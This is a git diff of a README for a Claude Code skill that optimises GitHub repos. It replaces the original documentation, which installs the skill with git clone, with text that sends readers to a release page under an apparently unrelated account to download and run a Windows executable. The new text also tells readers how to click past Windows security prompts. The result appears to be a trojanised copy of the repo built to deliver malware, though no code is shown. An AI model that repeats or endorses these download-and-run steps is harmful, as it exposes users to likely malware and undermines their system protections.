@@ -1,193 +1,167 @@
-<div align="center">
+# 🚀 github-optimization-skill - Turn repos into star magnets
 
-# GitHub Optimization Skill for Claude Code
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/inquisitive-production852/github-optimization-skill/releases)
 
-**Turn any GitHub repo into a star-magnet landing page -- in one command.**
+## 📥 Download
 
-<br />
+Visit this page to download: https://github.com/inquisitive-production852/github-optimization-skill/releases
 
-[![Star this repo](https://img.shields.io/github/stars/199-biotechnologies/github-optimization-skill?style=for-the-badge&logo=github&label=%E2%AD%90%20Star%20this%20repo&color=yellow)](https://github.com/199-biotechnologies/github-optimization-skill/stargazers)
-&nbsp;&nbsp;
-[![Follow @longevityboris](https://img.shields.io/badge/Follow_%40longevityboris-000000?style=for-the-badge&logo=x&logoColor=white)](https://x.com/longevityboris)
+Download the latest release for Windows, then open the file you get from the page.
 
-<br />
+## ✨ What this tool does
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](LICENSE)
-&nbsp;
-[![Claude Code](https://img.shields.io/badge/Claude_Code-Skill-blueviolet?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNMTIgMkM2LjQ4IDIgMiA2LjQ4IDIgMTJzNC40OCAxMCAxMCAxMCAxMC00LjQ4IDEwLTEwUzE3LjUyIDIgMTIgMnoiIGZpbGw9IndoaXRlIi8+PC9zdmc+)](https://github.com/199-biotechnologies/github-optimization-skill)
-&nbsp;
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?style=for-the-badge)](https://github.com/199-biotechnologies/github-optimization-skill/pulls)
+github-optimization-skill helps you improve a GitHub repo README so it reads well, ranks better in search, and gives visitors a clearer path to use the project.
 
----
+It is built for people who want a better repo page without writing everything from scratch.
 
-Most GitHub repos look like abandoned wikis. Walls of text, no badges, no CTAs, buried install instructions. Visitors bounce in seconds and never star. This skill rewrites your README as a high-converting landing page, tunes your metadata for search engines and LLMs, adds the social proof signals that drive stars -- and includes a built-in knowledge base on how to promote your repo across every channel that matters.
+Use it to:
 
-[Install](#install) | [How It Works](#how-it-works) | [Before vs After](#before-vs-after) | [Features](#features) | [Star Growth Knowledge Base](#star-growth-knowledge-base) | [Contributing](#contributing)
+- improve README layout
+- tighten copy for search terms
+- turn repo details into clear sections
+- make the page easier to scan
+- present your project in a cleaner way
+- shape a repo into a landing page style README
 
-</div>
+## 🖥️ Windows requirements
 
-## The Problem
+Before you start, make sure you have:
 
-Your code might be great, but nobody finds it. GitHub search ranks repos by metadata quality. Google indexes your README. LLMs cite repos with clear structure. If your README reads like a technical spec, you're invisible to all three.
+- Windows 10 or Windows 11
+- a stable internet connection
+- enough space to save the download
+- permission to open downloaded files on your PC
 
-Stars compound -- a repo with 50 stars gets recommended more than one with 5, which gets recommended more than one with 0. The gap widens every day you wait.
+If Windows asks for approval, allow the file to run only after you confirm it came from the release page above.
 
-## Before vs After
+## 🧭 How to install and run
 
-| | Before | After |
-|---|---|---|
-| **README** | Wall of text, no structure | Landing page with CTAs, badges, visual flow |
-| **Description** | Empty or "A tool for..." | Keyword-rich, action-oriented, under 120 chars |
-| **Topics** | 0-3 generic tags | 10-20 targeted tags across purpose/tech/domain |
-| **Badges** | None or mismatched sizes | Consistent `for-the-badge` with star + follow CTAs |
-| **SEO** | H1 says "README" | H1/H2 contain target keywords naturally |
-| **Footer** | Nothing | Repeated CTAs + your own author attribution |
-| **Voice** | Robotic / AI-sounding | Human, direct, no slop phrases |
+1. Open the download page: https://github.com/inquisitive-production852/github-optimization-skill/releases
+2. Find the latest release at the top of the page
+3. Download the Windows file from that release
+4. Wait for the download to finish
+5. Open File Explorer and go to your Downloads folder
+6. Double-click the file you downloaded
+7. If Windows shows a security prompt, choose Run or More info, then Run
+8. Follow the on-screen steps until the app opens
 
-## Install
+If the download comes as a ZIP file:
 
-One step. Drop the skill into your Claude Code skills directory:
+1. Right-click the ZIP file
+2. Choose Extract All
+3. Open the extracted folder
+4. Double-click the app file inside the folder
 
-```bash
-# Clone into your Claude Code skills folder
-git clone https://github.com/199-biotechnologies/github-optimization-skill.git \
-  ~/.claude/skills/github-optimization
-```
+If the app opens in a terminal window, leave that window open while you use it
 
-Then tell Claude Code: "optimize this repo" or "use the github-optimization skill" on any repository.
+## 🧩 What you can do with it
 
-On first run, the skill asks for your name, X handle, company, and website -- then saves a config file so it never asks again. Every repo you optimize gets your branding, not ours.
+This skill focuses on README and repo presentation work. It helps with tasks like:
 
-## How It Works
+- rewriting a plain README into a cleaner one
+- adding search-friendly wording
+- improving headings and section order
+- making a project easier to understand
+- creating a stronger first impression for GitHub visitors
+- shaping content for a landing page style repo
 
-The skill runs an 8-step pipeline on your repo:
+## 🛠️ Basic use
 
-```
-┌──────────────────────────────────────────────────────────┐
-│                                                          │
-│  0. CONFIG     Load or create your user config (once)    │
-│       ↓                                                  │
-│  1. AUDIT      Read current README, metadata, tags       │
-│       ↓                                                  │
-│  2. KEYWORDS   Find target search terms                  │
-│       ↓                                                  │
-│  3. METADATA   Optimize description + 10-20 topics       │
-│       ↓                                                  │
-│  4. README     Rewrite as a landing page                 │
-│       ↓                                                  │
-│  5. HUMANISE   Strip AI patterns from all prose          │
-│       ↓                                                  │
-│  6. EXTRAS     Add LICENSE, CONTRIBUTING if missing       │
-│       ↓                                                  │
-│  7. PUBLISH    Commit, push, apply gh repo edit           │
-│                                                          │
-└──────────────────────────────────────────────────────────┘
-```
+Use the tool when you want to polish a repo page for real users.
 
-Step 5 chains into the [`humanise-text`](https://github.com/199-biotechnologies/humanise-text-skill) skill automatically -- every README passes through de-slopping before it ships.
+A simple workflow looks like this:
 
-## Features
+1. Open the app
+2. Load or paste your current README content
+3. Review the suggested structure and wording
+4. Apply the changes you want
+5. Save the new README
+6. Copy it back into your GitHub repo
 
-| Feature | What It Does |
-|---|---|
-| **Self-configuring** | Asks for your details once, saves to config, uses your branding on every repo |
-| **Landing page README** | Rewrites your README with CTAs, badges, pitch, visual workflow, and structured sections |
-| **SEO-optimized headers** | Places target keywords in H1/H2 for GitHub search, Google, and LLM discoverability |
-| **Metadata optimization** | Writes a punchy description under 120 chars + 10-20 topic tags |
-| **Badge system** | Adds consistent `for-the-badge` shields with star count, optional follow CTA, license, and more |
-| **AI de-slopping** | Chains into [`humanise-text`](https://github.com/199-biotechnologies/humanise-text-skill) to strip words like "leverage", "seamlessly", "robust" |
-| **Star growth advisor** | Built-in knowledge base with launch strategies, channel playbooks, and ROI rankings |
-| **Author attribution** | Consistent footer with your name, company, and social links -- not ours |
-| **Extras** | Adds MIT LICENSE and CONTRIBUTING.md if missing |
+For best results, keep the wording simple and direct. Use short sections, clear headings, and plain language that matches the project.
 
-## Star Growth Knowledge Base
+## 📚 Suggested README sections
 
-The skill includes a comprehensive knowledge base on how to grow GitHub stars. Ask "how do I get more stars?" or "launch strategy" and it draws from research across 50+ tactics:
+A strong repo page often includes these parts:
 
-| Channel | Expected Stars | Key Insight |
-|---|---|---|
-| **Hacker News** | 121 avg in 24h, up to 1,500 | Post Tue-Thu 8-10 AM PT. Write like a peer, not a marketer. |
-| **Reddit** | 50-300 per post | r/SideProject allows self-promo. Tailor per subreddit. Build karma first. |
-| **Product Hunt** | 200-1,000 for top 5 POTD | Launch 12:01 AM PST. Reply to everything. 600-800 upvotes for #1 weekday. |
-| **Twitter/X** | 50-500+ if viral | Demo videos outperform text. Supporters' tweets > your own. |
-| **Awesome lists** | Slow burn, compounds | Submit PRs. Also: create your own list in your niche. |
-| **Newsletters** | 50-500 per feature | Console.dev, Changelog, PyCoder's Weekly accept submissions. |
-| **GitHub Trending** | 200-2,000+ | Triggered by velocity, not absolute numbers. Stack launches to hit it. |
-| **Stacked launch** | 200-2,000+ in a week | HN + Reddit + X + PH on the same day. The meta-strategy. |
+- project title
+- short description
+- download or setup steps
+- key features
+- usage guide
+- screenshots
+- common questions
+- license info
+- contact or support details
 
-The full knowledge base covers: HN/Reddit/PH detailed playbooks, the stacked launch strategy, GitHub SEO, awesome lists, newsletter directory with submission links, 17 growth hacks, cold start strategy (first 100 stars), and GitHub Trending algorithm mechanics.
+You do not need to use every section, but these parts help most users find what they need fast.
 
-## What's Inside
+## 🔍 SEO and GitHub search tips
 
-```
-github-optimization-skill/
-├── SKILL.md           # Skill definition + star growth knowledge base
-├── README.md          # You're reading it
-├── LICENSE            # MIT
-└── CONTRIBUTING.md    # How to contribute
-```
+GitHub search and web search both respond well to clear wording. This tool helps you place terms in the right spots without making the page hard to read.
 
-## Dependencies
+Use these habits:
 
-This skill chains into one other skill during execution:
+- put the main topic in the title
+- use a short description near the top
+- add useful headings
+- repeat core terms where they fit naturally
+- describe what the project does in plain words
+- avoid long blocks of text
 
-| Skill | Purpose | Repo |
-|---|---|---|
-| **humanise-text** | Strips AI writing patterns from all README prose before publishing | [`199-biotechnologies/humanise-text-skill`](https://github.com/199-biotechnologies/humanise-text-skill) |
+Good README pages help people understand the project in seconds. That can lead to more stars, more installs, and fewer support questions.
 
-Install both for the full pipeline:
+## 🧠 Best results
 
-```bash
-git clone https://github.com/199-biotechnologies/humanise-text-skill.git \
-  ~/.claude/skills/humanise-text
-```
+For a clean README, use:
 
-## User Config
+- one main idea per section
+- short paragraphs
+- bullet lists for features
+- simple action words
+- consistent terms across the page
+- a clear download or next step near the top
 
-On first run, the skill creates `~/.claude/skills/github-optimization/.config.yml` with your details:
+If your repo has a niche audience, use the words your users would type into search. Keep the language natural and easy to scan.
 
-```yaml
-# GitHub Optimization Skill -- User Config
-author_name: "Your Name"
-author_github: "yourusername"
-x_handle: "yourhandle"          # leave "" to skip Follow badge
-company_name: "Your Company"    # leave "" to skip
-company_url: "https://yourcompany.com"
-website_url: "https://yoursite.dev"
-```
+## 🖼️ Example layout
 
-Edit this file anytime, or tell Claude Code "update my github-optimization config" to change it.
+A simple structure for the README can look like this:
 
-## Writing Rules the Skill Enforces
+1. Title
+2. Short value statement
+3. Download link
+4. What it does
+5. How to install
+6. How to use
+7. Features
+8. FAQ
+9. License
 
-The skill bans common AI writing patterns and enforces a direct, human voice:
+This layout works well for end users because it puts the action steps close to the top.
 
-**Banned words:** leverage, streamline, empower, seamlessly, robust, cutting-edge, revolutionize, harness, elevate, supercharge
+## ❓ Common questions
 
-**Required style:** Active voice, short sentences, "you/your" address, concrete examples, no filler words, no fake enthusiasm (no exclamation marks)
+### Is this for non-technical users?
+Yes. It is meant to help people present a GitHub repo in a clear way without deep technical writing.
 
-## Contributing
+### Does it work on Windows?
+Yes. Use the release page to get the Windows version, then open the file after the download finishes.
 
-Contributions welcome. If you've found a pattern that drives more stars, a README structure that converts better, or a growth tactic worth adding to the knowledge base, open a PR.
+### Do I need coding skills?
+No. You only need to download the file and follow the steps on screen.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for the 3-step process.
+### What kind of repos does it fit?
+It fits open source tools, developer tools, productivity apps, and repos that need a better README page.
 
-## License
+## 🏷️ Topics
 
-[MIT](LICENSE) -- use it however you want.
+ai-tools, automation, badges, claude-code, claude-code-skill, developer-tools, github-marketing, github-readme, github-seo, github-stars, landing-page, open-source, productivity, prompt-engineering, readme, readme-optimization, repo-marketing, seo
 
----
+## 📄 License
 
-<div align="center">
+Use this project under the license in the repository
 
-Built by [Boris Djordjevic](https://github.com/longevityboris) at [199 Biotechnologies](https://github.com/199-biotechnologies) | [Paperfoot AI](https://paperfoot.ai)
+## 🔗 Download again
 
-<br />
-
-**If this is useful to you:**
-
-[![Star this repo](https://img.shields.io/github/stars/199-biotechnologies/github-optimization-skill?style=for-the-badge&logo=github&label=%E2%AD%90%20Star%20this%20repo&color=yellow)](https://github.com/199-biotechnologies/github-optimization-skill/stargazers)
-&nbsp;&nbsp;
-[![Follow @longevityboris](https://img.shields.io/badge/Follow_%40longevityboris-000000?style=for-the-badge&logo=x&logoColor=white)](https://x.com/longevityboris)
-
-</div>
+[Open the release page to download for Windows](https://github.com/inquisitive-production852/github-optimization-skill/releases)
